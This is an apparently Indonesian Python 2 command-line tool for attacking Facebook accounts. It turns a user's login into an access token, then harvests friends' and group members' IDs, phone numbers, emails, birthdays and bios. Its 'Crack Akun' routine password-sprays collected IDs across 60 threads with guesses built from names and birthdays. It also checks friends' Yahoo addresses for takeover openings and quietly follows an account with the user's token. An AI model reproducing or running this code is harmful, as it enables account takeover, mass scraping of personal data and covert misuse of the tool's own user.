# -*- coding: UTF-8 -*-.
import os;import random;import datetime;from multiprocessing.pool import ThreadPool;import json;import threading;import re;import hashlib;import time;import urllib;import sys
try:
	import requests;import mechanize
except ImportError as v:
	print "Install Module [ %s ]"%(v)
	sys.exit()
from  urllib2 import URLError
reload(sys);br = mechanize.Browser();br.set_handle_robots(False);br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1);br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
user_agents = ['User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16']
#--------Warna
i="\033[32m" #hijau
cg="\033[36m" #cyan gelap
k="\033[33;1m" #kuning
p="\033[0m" #putih
ba="\033[96;1m" #biruaqua
pu="\033[35m" # #purple
gr="\033[37m" #putih terang
pb="\033[47m" #putihbold
m="\033[31m" #merah
b="\033[34m" # Biru
#------------------#
log = """
         \033[34m╔════════════════════════════════╗
           \033[31m⏣ \033[32mAuthor   \033[37m: Mr.tcg
           \033[31m⏣ \033[32mMy Team  \033[37m: Lᴵᴳᴴᵀ Cᵞᴮᴱᴿ Iᴺᴰᴼᴺᴱˢᴵᴬ
           \033[31m⏣ \033[32mwhatsapp \033[37m: 083813844572
           \033[31m⏣ \033[32mCodeName \033[37m: \033[36mMr.Tcg_Cyber \033[0;1mv1.1
         \033[34m╚════════════════════════════════╝
"""
def login():
	os.system("clear")
	try:
		token = open('fb.txt', 'r')
		menu()
	except (KeyError, IOError):
		try:
			print log
			id = raw_input("%s[%s!%s] %sMasukan ID : %s"%(b,m,b,i,cg))
			pw = raw_input("%s[%s!%s] %sMasukan Password : %s"%(b,m,b,i,cg))
			br.open('https://m.facebook.com');br._factory.is_html = True;br.select_form(nr=0)
			br.form['email'] = id
			br.form['pass'] = pw
			br.submit()
			url = br.geturl()
			if 'save-device' in url:
				sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pw + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pw, 'return_ssl_resources': '0', 'v': '1.0'}
				x = hashlib.new('md5');x.update(sig);a = x.hexdigest()
				data.update({'sig': a})
				url = 'https://api.facebook.com/restserver.php'
				r = requests.get(url, params=data)
				z = json.loads(r.text)
				ax = open('fb.txt', 'w')
				ax.write(z['access_token'])
				ax.close()
				print '\n<✔> Login berhasil'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
				menu()
			if 'checkpoint' in url:
				print '\n<✘> Akun Checkpoint'
				os.system('rm -rf fb.txt')
				login()
			else:
				print '\n<✘> Login Gagal'
				sys.exit()
		except URLError:
			print "%s[%s!%s] %sKoneksi Bermasalah !"%(b,m,b,i)
		except EOFError:
			print "\n%s[%s!%s] %sExit Program !"%(b,m,b,i)
		except KeyboardInterrupt:
			print "%s[%s!%s] %sJembot !"%(b,m,b,i)
idtm = []
def menu():
	try:
		token = open('fb.txt', 'r').read()
	except KeyError:
		login()
	else:
		try:
			os.system("clear")
			ad = requests.get('https://graph.facebook.com/me?access_token=' + token)
			xa = json.loads(ad.text)
			nama = xa["name"]
			id = xa["id"]
			ji = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
			ha = json.loads(ji.text)
			for c in ha["data"]:
				idtm.append(c["id"])
			print log
			print """
         ╔════════════════════════════════╗
         \033[32m✒ Nama         : \033[37m{}
         \033[32m✒ ID           : \033[37m{}
         \033[32m✒ Jumlah Teman : \033[37m{}
    \033[35m▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁\033[33;1m✍
    \033[31m[ \033[32m1 \033[31m] \033[37mLihat ID           \033[31m[ \033[32m8 \033[31m] \033[37mLihat Jenis Kelamin
    \033[31m[ \033[32m2 \033[31m] \033[37mLihat No Hp        \033[31m[ \033[32m9 \033[31m] \033[37mLihat Tanggal Lahir
    \033[31m[ \033[32m3 \033[31m] \033[37mLihat Bio          \033[31m[ \033[32m10 \033[31m] \033[37mReport Akun
    \033[31m[ \033[32m4 \033[31m] \033[37mCrack Akun !
    \033[31m[ \033[32m5 \033[31m] \033[37mLihat Daftar Group
    \033[31m[ \033[32m6 \033[31m] \033[37mLihat Email
    \033[31m[ \033[32m7 \033[31m] \033[37mEmail Vuln
    \033[31m[ \033[33;1mE \033[31m] \033[37mExit
			""".format(nama,id,len(idtm))
			oa = raw_input("\033[34m[\033[32m!\033[34m] \033[37mPilih Menu : \033[0;1m")
			if oa == "1":
				aka()
			elif oa == "2":
				getphone()
			elif oa == "3":
				mbio()
			elif oa == "4":
				mcrack()
			elif oa == "5":
				viewgr()
			elif oa == "6":
				bao()
			elif oa == "7":
				menyahoo()
			elif oa == "8":
				dumpge()
			elif oa == "9":
				getlahir()
			elif oa == "10":
				report()
			elif oa == "b" or oa == "B":
				menu()
			elif oa == "e" or oa == "E":
				sys.exit()
		except EOFError:
			print "%s[%s!%s] %sKeluar !"%(b,m,b,gr)
		except KeyboardInterrupt:
			print "%s[%s!%s] %sKeluar !"%(b,m,b,gr)
		except requests.exceptions.ConnectionError:
			sys.exit("%s[%s!%s] %sChecking Your Data !"%(b,m,b,gr))
		except KeyError: sys.exit()
id = []
def aka():
	os.system("clear")
	try:
		print log
		print """
    \033[35m▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁\033[33;1m✍
    \033[31m[ \033[32m1 \033[31m] \033[37mLihat ID Teman
    \033[31m[ \033[32m2 \033[31m] \033[37mLihat ID Teman Dari Teman
    \033[31m[ \033[32m3 \033[31m] \033[37mLihat ID Teman Di Group
    \033[31m[ \033[31mB \033[31m] \033[37mBack
    \033[31m[ \033[33;1mE \033[31m] \033[37mExit
		"""
		kad = raw_input("\033[34m[\033[32m!\033[34m] \033[37mPilih Menu : \033[0;1m")
		if kad == "1":
			getid()
		elif kad == "3":
			os.system("reset")
			token = open("fb.txt", "r").read()
			print log
			lo = raw_input("\033[34m[\033[32m!\033[34m] \033[37mMasukan ID : \033[0;1m")
			try:
				az = requests.get('https://graph.facebook.com/group/?id=' + lo + '&access_token=' + token)
				zb = json.loads(az.text)
				print """
\033[0;1m╔═══════════════════════════════════════════
║   \033[32mNama : {}
\033[0;1m╚═══════════════════════════════════════════
				""".format(zb["name"])
			except KeyError:
				print "%s[%s!%s] %sGroup Tidak Di Temukan !"%(b,m,b,gr),;time.sleep(1)
				aka()
			ax = requests.get('https://graph.facebook.com/' + lo + '/members?fields=name,id&limit=999999999&access_token=' + token)
			opa = json.loads(ax.text)
			for o in opa["data"]:
				print "\033[34m[\033[37m+\033[34m] \033[32mNama : \033[37m%s \033[31m=> \033[32mID : \033[37m%s"%(o["name"],o["id"])
			print "\033[34m[\033[0;1m!\033[34m] \033[36mBerhasil lihat ID Di Group \033[0;1m%s"%(zb["name"])
			raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
			aka()
		elif kad == "2":
			os.system("clear")
			token = open("fb.txt", "r").read()
			try:
				print log
				na = raw_input("\033[34m[\033[32m!\033[34m] \033[37mMasukan ID Teman : \033[0;1m")
				a = requests.get('https://graph.facebook.com/' + na + '?access_token=' + token)
				b = json.loads(a.text)
				nama = b["name"]
				print """
\033[0;1m╔═══════════════════════════════════════════
║   \033[32mNama : {}
\033[0;1m╚═══════════════════════════════════════════
				""".format(nama)
			except KeyError:
				print "%s[%s!%s] %suser tidak ada "%(b,m,b,gr),;time.sleep(1)
				aka()
			am = requests.get('https://graph.facebook.com/' + na + '?fields=friends.limit(5000)&access_token=' + token)
			la = json.loads(am.text)
			for a in la['friends']['data']:
				print "[+] ID : %s"%(a["name"],a["id"])
				idtm.append(a["id"])
				time.sleep(0.001)
			print "\n%s[%s+%s] %sSaving %sid.txt"%(b,m,b,gr,i)
			print "</> Succesfuly Dump ID Name Jumlah ID : %s "%(len(idtm))
			lx = raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
			if lx == "":
				aka()
			else:
				aka()
		elif kad == "b" or kad == "B":
			menu()
		elif kad == "e" or kad == "E":
			sys.exit()
	except:
		print "[!] Salah !"
def getid():
	token = token = open('fb.txt', 'r').read()
	try:
		os.system("clear");print log
		ain = open("id.txt", "w")
		print "\033[34m<\033[0;1m/\033[34m> \033[32mTunggu !!"
		am = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
		nz = json.loads(am.text)
		for ck in nz["data"]:
			print "\r\033[34m[\033[37m+\033[34m] \033[32mNama : \033[37m%s \033[31m=> \033[32mID : \033[37m%s"%(ck["name"],ck["id"]),;sys.stdout.flush()
			ain.write(ck["name"] + ' | ' + ck["id"] + '\n')
			idtm.append(ck["id"])
			time.sleep(0.1)
		ain.close()
		print "\n\033[34m<\033[0;1m/\033[34m> \033[0mSuccesfuly Dump Total \033[36m%s\033[0m Saving File \033[33mid.txt"%(len(idtm))
		mzo = raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
		if mzo == "":
			aka()
		else:
			aka()
	except:
		print "exit"
def mbio():
	os.system("clear")
	try:
		print log
		print """
    \033[35m▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁\033[33;1m✍
    \033[31m[ \033[32m1 \033[31m] \033[37mTampilkan Bio Teman
    \033[31m[ \033[32m2 \033[31m] \033[37mTampilkan Bio Teman Dari Teman
    \033[31m[ \033[33;1mE \033[31m] \033[37mKeluar
    \033[31m[ \033[33;1mB \033[31m] \033[37mKembali
		"""
		ba = raw_input("\033[34m[\033[32m!\033[34m] \033[37mPilih Menu : \033[0;1m")
		if ba == "1":
			bio()
		elif ba == "e" or ba == "E":
			sys.exit()
		elif ba == "b" or ba == "B":
			menu()
		elif ba == "2":
			os.system("clear")
			print log
			token = open("fb.txt", "r").read()
			apk = raw_input("Masukan ID Teman : ")
			try:
				la = requests.get('https://graph.facebook.com/' + apk + '?access_token=' + token)
				apa = json.loads(la.text)
				nama = apa["name"]
				print """
    \033[0;1m╔═══════════════════════════════════════════
    ║   \033[32mNama : {}
    \033[0;1m╚═══════════════════════════════════════════
				""".format(nama)
			except KeyError:
				print "wrong User "
				mbio()
			an = requests.get('https://graph.facebook.com/' + apk + '?fields=friends.limit(5000)&access_token=' + token)
			nz = json.loads(an.text)
			for a in nz['friends']['data']:
				an = requests.get('https://graph.facebook.com/' + a["id"] + '?access_token=' + token)
				lpn = json.loads(an.text)
				try:
					print """
╔═══════════════════════════════════════════
║   Nama : {}
╚═══════════════════════════════════════════
   {}
╚═══════════════════════════════════════════
					""".format(lpn["name"],lpn["bio"])
				except KeyError:
					pass
			print "Succesfuly Grabbing Bio ,-"
			raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
		else:
			mbio()
	except EOFError:
		print "fuck"
def bio():
	os.system("clear")
	print log
	print "</> Pliss Tunggu ! "
	token = open("fb.txt", "r").read()
	ka = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
	za = json.loads(ka.text)
	for aku in za["data"]:
		ap = requests.get('https://graph.facebook.com/' + aku["id"] + '?access_token=' + token)
		pz = json.loads(ap.text)
		try:
			print """
╔═══════════════════════════════════════════
║   Nama : {}
╚═══════════════════════════════════════════
   {}
╚═══════════════════════════════════════════
			""".format(pz["name"],pz["bio"])
		except KeyError:
			pass
	print "Succesfuly Grabbing Bio ,-"
	ax = raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
	if ax == "":
		mbio()
	else:
		mbio()
phone = []
def getphone():
	os.system("reset")
	token = open("fb.txt", "r").read()
	try:
		print log
		print "</> Tunggu Sebentar >_<"
		ax = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
		px = json.loads(ax.text)
		for ao in px["data"]:
			la = requests.get('https://graph.facebook.com/' + ao['id'] + '?access_token=' + token)
			ax = json.loads(la.text)
			try:
				print "[+] Nama : %s => Phone : %s"%(ax["name"],ax['mobile_phone'])
				phone.append(ax['mobile_phone'])
			except KeyError:
				pass
		print "</> Succesfuly Dump Phone Total : %s"%(len(phone))
		ox = raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
		if ox == "":
			menu()
		else:
			menu()
	except KeyError:
		print "[!] Sepertinya ada Masalah !"
def mcrack():
	os.system("clear")
	print log
	print """
    \033[35m▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁\033[33;1m✍
    \033[31m[ \033[32m1 \033[31m] \033[37mCrack Dari Teman
    \033[31m[ \033[32m2 \033[31m] \033[37mCrack Teman Dari Teman
    \033[31m[ \033[32m3 \033[31m] \033[37mCrack Dari Group
    \033[31m[ \033[33;1mE \033[31m] \033[37mKembali
    \033[31m[ \033[33;1mB \033[31m] \033[37mExit
	"""
	ax = raw_input("\033[34m[\033[32m!\033[34m] \033[37mPilih Menu : \033[0;1m")
	if ax == "1":
		token = open("fb.txt", "r").read()
		anu = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
		vk = json.loads(anu.text)
		for o in vk["data"]:
			id.append(o["id"])
	elif ax == "3":
		os.system("clear")
		print log
		token = open("fb.txt", "r").read()
		nod_va = raw_input("Masukan ID Group : ")
		try:
			ab_volt = requests.get('https://graph.facebook.com/group/?id=' + nod_va + '&access_token=' + token)
			jadi = json.loads(ab_volt.text)
			nama = jadi["name"]
		except KeyError:
			print "[!] Group Tidak Di Temukan !"
			raw_input("Back >> ")
			mcrack()
		bxo = requests.get('https://graph.facebook.com/' + nod_va + '/members?fields=name,id&limit=999999999&access_token=' + token)
		jad = json.loads(bxo.text)
		for l in jad["data"]:
			id.append(l["id"])#
	else:
		if ax == "2":
			os.system("clear")
			print log
			an = raw_input("%s[%s!%s] %sMasukan ID Teman : %s"%(b,m,b,gr,i))
			try:
				token = open("fb.txt", "r").read()
				ac = requests.get('https://graph.facebook.com/' + an + '?access_token=' + token)
				pn = json.loads(ac.text)
				print """
    \033[0;1m╔═══════════════════════════════════════════
    ║   \033[32mNama : {}
    \033[0;1m╚═══════════════════════════════════════════
				""".format(pn["name"])
			except KeyError:
				print "%s[%s!%s] %sWrong User"%(b,m,b,gr)
				menu()
			sx = requests.get('https://graph.facebook.com/' + an + '?fields=friends.limit(5000)&access_token=' + token)
			an = json.loads(sx.text)
			for ax in an['friends']['data']:
				id.append(ax["id"])
		else:
			mcrack()
	user_agents = ['User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16',
					'Opera/8.00 (Windows NT 5.1; U; en)']
	print "\033[34m[\033[31m+\033[34m] \033[37mTotal ID \033[32m%s \033[37mCrack ! "%(len(str(id)))
	def crack(arg):
		user = arg
		try:
			a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + token)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '123'
			data=requests.post("https://mbasic.facebook.com/{}".format("login"),data={"email":user,"pass":pass1},headers={'User-Agent': user_agents}).url
			if "save-device" in data or "m_sess" in data:
				print "[Live] ID : "+user+" Password :"+pass1
			else:
				if "checkpoint" in data or "challange" in data:
					print "[cp] ID : "+user+" Password :"+pass1
				else:
					ax = b['first_name'] + '123'
					pass2 = ax.lower()
					data=requests.post("https://mbasic.facebook.com/{}".format("login"),data={"email":user,"pass":pass2},headers={'User-Agent': user_agents}).url
					if "save-device" in data or "m_sess" in data:
						print "[Live] ID : "+user+" Password :"+pass2
					else:
						if "checkpoint" in data or "challange" in data:
							print "[cp] ID : "+user+" Password :"+pass2
						else:
							pass3 = b['first_name'] + '12345'
							data=requests.post("https://mbasic.facebook.com/{}".format("login"),data={"email":user,"pass":pass3},headers={'User-Agent': user_agents}).url
							if "save-device" in data or "m_sess" in data:
								print "[Live] ID : "+user+" Password :"+pass3
							else:
								if "checkpoint" in data or "challange" in data:
									print "[cp] ID : "+user+" Password :"+pass3
								else:
									ab = b['first_name'] + '12345'
									pass4 = ab.lower()
									data=requests.post("https://mbasic.facebook.com/{}".format("login"),data={"email":user,"pass":pass3},headers={'User-Agent': user_agents}).url
									if "save-device" in data or "m_sess" in data:
										print "[Live] ID : "+user+" Password :"+pass4
									else:
										if "checkpoint" in data or "challange" in data:
											print "[cp] ID : "+user+" Password :"+pass4
										else:
											pass5 = b['first_name'] + '123456'
											data=requests.post("https://mbasic.facebook.com/{}".format("login"),data={"email":user,"pass":pass5},headers={'User-Agent': user_agents}).url
											if "save-device" in data or "m_sess" in data:
												print "[Live] ID : "+user+" Password :"+pass5
											else:
												if "checkpoint" in data or "challange" in data:
													print "[cp] ID : "+user+" Password :"+pass5
												else:
													ano = b['first_name'] + '123456'
													pass6 = ano.lower()
													data=requests.post("https://mbasic.facebook.com/{}".format("login"),data={"email":user,"pass":pass6},headers={'User-Agent': user_agents}).url
													if "save-device" in data or "m_sess" in data:
														print "[Live] ID : "+user+" Password :"+pass6
													else:
														if "checkpoint" in data or "challange" in data:
															print "[cp] ID : "+user+" Password :"+pass6
														else:
															c = b['birthday']
															pass7 = c.replace('/', '')
															data=requests.post("https://mbasic.facebook.com/{}".format("login"),data={"email":user,"pass":pass7},headers={'User-Agent': user_agents}).url
															if "save-device" in data or "m_sess" in data:
																print "[Live] ID : "+user+" Password :"+pass7
															else:
																if "checkpoint" in data or "challange" in data:
																	print "[cp] ID : "+user+" Password :"+pass7
																else:
																	c = b['first_name'] + b['birthday']
																	na = c.replace('/', '')
																	pass8 = na.lower()
																	data=requests.post("https://mbasic.facebook.com/{}".format("login"),data={"email":user,"pass":pass8},headers={'User-Agent': user_agents}).url
																	if "save-device" in data or "m_sess" in data:
																		print "[Live] ID : "+user+" Password :"+pass8
																	else:
																		if "checkpoint" in data or "challange" in data:
																			print "[cp] ID : "+user+" Password :"+pass8
																		else:
																			oa = b['last_name']
																			ja = oa.lower()
																			pass9 = b['first_name'] + ' ' + ja
																			data=requests.post("https://mbasic.facebook.com/{}".format("login"),data={"email":user,"pass":pass9},headers={'User-Agent': user_agents}).url
																			if "save-device" in data or "m_sess" in data:
																				print "[Live] ID : "+user+" Password :"+pass9
																			else:
																				if "checkpoint" in data or "challange" in data:
																					print "[cp] ID : "+user+" Password :"+pass9
		except:
			pass
	p = ThreadPool(60)
	p.map(crack, id)
	raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
	menu()
def viewgr():
	os.system("clear")
	print log
	try:
		token = open("fb.txt", "r").read()
		alo = requests.get('https://graph.facebook.com/me/groups?access_token=' + token)
		lp = json.loads(alo.text)
		for ok in lp["data"]:
			nama = ok["name"]
			piv = ok["privacy"]
			id = ok["id"]
			print """
╔═══════════════════════════════════════════
║   Nama Group : {}
╚═══════════════════════════════════════════
     ID Group   : {}
     Privasi    : {}
════════════════════════════════════════════
			""".format(nama,id,piv)
		raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
		menu()
	except KeyError:
		print "[!] Anda Tidak Memiliki Group"
def bao():
	os.system("clear")
	try:
		print log
		print """
    \033[35m▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁\033[33;1m✍
    \033[31m[ \033[32m1 \033[31m] \033[37mLihat Email Teman
    \033[31m[ \033[32m2 \033[31m] \033[37mLihat Email Teman Dari Teman !
    \033[31m[ \033[33;1mE \033[31m] \033[37mBack
    \033[31m[ \033[33;1mB \033[31m] \033[37mExit
		"""
		jad = raw_input("\033[34m[\033[32m!\033[34m] \033[37mPilih Menu : \033[0;1m")
		if jad == "1":
			edup()
		elif jad == "2":
			anz()
		else:
			bao()
	except EOFError:
		sys.exit("Exit")
def anz():
	os.system("clear")
	token=open("fb.txt", "r").read()
	axt = raw_input("Masukan ID : ")
	try:
		am = requests.get('https://graph.facebook.com/' + axt + '?access_token=' + token)
		op = json.loads(am.text)
		print """
    \033[0;1m╔═══════════════════════════════════════════
    ║   \033[32mNama : {}
    \033[0;1m╚═══════════════════════════════════════════
		""".format(op["name"])
	except KeyError:
		print "Blum Berteman / Tidak Di temukan !"
	ab = requests.get('https://graph.facebook.com/' + axt + '?fields=friends.limit(5000)&access_token=' + token)
	nx = json.loads(ab.text)
	for xb in nx['friends']['data']:
		id.append(xb["id"])
		print "\r[+] Ambil ID %s Di Terima"%(xb["id"]),;sys.stdout.flush()
		time.sleep(0.01)
	print "\n[+] ID Di Dump Total %s"%(str(len(id)))
	print "[+] Mulai..."
	def scan(arg):
		auh = requests.get('https://graph.facebook.com/' + arg + '?access_token=' + token)
		azn = json.loads(auh.text)
		try:
			print "[+] Nama : %s => Email : %s"%(azn["name"],azn['email'])
		except KeyError:
			pass
	p=ThreadPool(60)
	p.map(scan,id)
	raw_imput("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
	menu()
def edup():
	os.system("clear")
	token=open("fb.txt","r").read()
	ano = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
	fack = json.loads(ano.text)
	for av in fack["data"]:
		az = requests.get('https://graph.facebook.com/' + av['id'] + '?access_token=' + token)
		nu = json.loads(az.text)
		try:
			print "[+] Nama : %s => Email : %s"%(nu["name"],nu['email'])
		except KeyError:
			pass
	raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
	menu()
email = []
def menyahoo():
	os.system("clear")
	print log
	print """
    \033[35m▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁\033[33;1m✍
    \033[31m[ \033[32m1 \033[31m] \033[37mCek Vuln Email Teman
    \033[31m[ \033[32m2 \033[31m] \033[37mCek Vuln Email Teman Dari Teman
    \033[31m[ \033[32m3 \033[31m] \033[37mCek Vuln Email Group(Comming Soon)
    \033[31m[ \033[33;1mE \033[31m] \033[37mBack
    \033[31m[ \033[33;1mB \033[31m] \033[37mExit
	"""
	neko = raw_input("\033[34m[\033[32m!\033[34m] \033[37mPilih Menu : \033[0;1m")
	if neko == "1":
		yaho()
	elif neko == "2":
		yahof()
	else:
		menyahoo()
def yaho():
	os.system("clear")
	print log
	token=open("fb.txt","r").read()
	ub = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
	dog = json.loads(ub.text)
	for go in dog["data"]:
		asn = requests.get('https://graph.facebook.com/' + go['id'] + '?access_token=' + token)
		bu = json.loads(asn.text)
		try:
			print "\r[+] Mengambil ID %s Di Terima"%(bu["id"]),;sys.stdout.flush();time.sleep(0.01)
			id = bu["id"]
		except KeyError:
			pass
	print "\n[+] Total Email %s"%(str(len(id)))
	print "[+] Mulai..."
	jz = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
	biz = json.loads(jz.text)
	for ot in biz["data"]:
		iz = requests.get('https://graph.facebook.com/' + ot['id'] + '?access_token=' + token)
		kuz = json.loads(iz.text)
		try:
			mail = kuz["email"]
			yahoo = re.compile('@.*')
			otw = yahoo.search(mail).group()
			nama = kuz["name"]
			if 'yahoo.com' in otw:
				br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
				br._factory.is_html = True
				br.select_form(nr=0)
				br['username'] = mail
				klik = br.submit().read()
				jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print "[Live] Nama : %s => Email : %s"%(nama,mail)
				else:
					pass
		except KeyError:
			pass
	print "[+] Succesfuly"
	raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
	menu()
def yahof():
	os.system("clear")
	token=open("fb.txt","r").read()
	ama = raw_input("Masukan ID : ")
	try:
		hub = requests.get('https://graph.facebook.com/' + ama + '?access_token=' + token)
		azu = json.loads(hub.text)
		print """
    \033[0;1m╔═══════════════════════════════════════════
    ║   \033[32mNama : {}
    \033[0;1m╚═══════════════════════════════════════════
		""".format(azu["name"])
	except KeyError:
		pass
	id = []
	ayu = requests.get('https://graph.facebook.com/' + ama + '?fields=friends.limit(5000)&access_token=' + token)
	js = json.loads(ayu.text)
	for mus in js['friends']['data']:
		id.append(mus["id"])
		print "\r[+] Ambil ID %s Di Terima"%(mus["id"]),;sys.stdout.flush();time.sleep(0.01)
	print "\n[+] Berhasil ID total %s"%(str(len(id)))
	print "[+] Mulai ..."
	aji = requests.get('https://graph.facebook.com/' + ama + '?fields=friends.limit(5000)&access_token=' + token)
	uba = json.loads(aji.text)#loads
	for bx in uba['friends']['data']:
		id = bx["id"]
		nama = bx["name"]
		bup = requests.get('https://graph.facebook.com/' + bx["id"] + '?access_token=' + token)
		ns = json.loads(bup.text)
		try:
			mail = ns['email']
			yahoo = re.compile('@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
				br._factory.is_html = True
				br.select_form(nr=0)
				br['username'] = mail
				klik = br.submit().read()
				jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print "[Live] Nama : %s => Email : %s "%(nama,mail)
				else:
					pass
		except KeyError:
			pass
	raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
	menu()
def dumpge():
	os.system("clear")
	token=open("fb.txt","r").read()
	print log
	print "</> Pliss Tunggu !!"
	ks = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
	xop = json.loads(ks.text)
	for ox in xop["data"]:
		uxp = requests.get('https://graph.facebook.com/' + ox["id"] + '?access_token=' + token)
		pal = json.loads(uxp.text)
		try:
			print "[+] Nama : %s => Gender : %s"%(pal["name"],pal["gender"])
		except KeyError:
			pass
	print "[+] Succesfuly Dump Gender"
	raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
	menu()
def getlahir():
	os.system("clear")
	token=open("fb.txt","r").read()
	print log
	print "</> Pliss Tunggu !!"
	kuk = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
	pul = json.loads(kuk.text)
	for jsonm in pul["data"]:
		by = requests.get('https://graph.facebook.com/' + jsonm["id"] + '?access_token=' + token)
		hek = json.loads(by.text)
		try:
			print "[+] Nama : %s => Tanggal : %s"%(hek["name"],hek['birthday'])
		except: pass
	print "[+] Succesfuly"
	raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
	menu()
def report():
	os.system("clear")
	print """
    \033[35m▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁\033[33;1m✍
    [ 1 ] Report User
    [ 2 ] Report Postingan
    [ B ] Back
    [ E ] Exit
	"""
	kuzu = raw_input("Masukan Menu : ")
	if kuzu == "1":
		lisense()
	elif kuzu == "2":
		print "Sedang Di perbaiki"
	else:
		report()
def lisense():
	os.system("clear")
	print log
	print "%s[%s+%s] %sAuto Report Membutuhkan Lisensi ! "%(b,m,b,gr)
	print "[ B ] Back"
	opn = raw_input("[+] Masukan Lisensi : ")
	if opn == "":
		print "kosong"
	elif opn == "b" or opn == "B":
		menu()
	else:
		print "Lisensi salah"
login()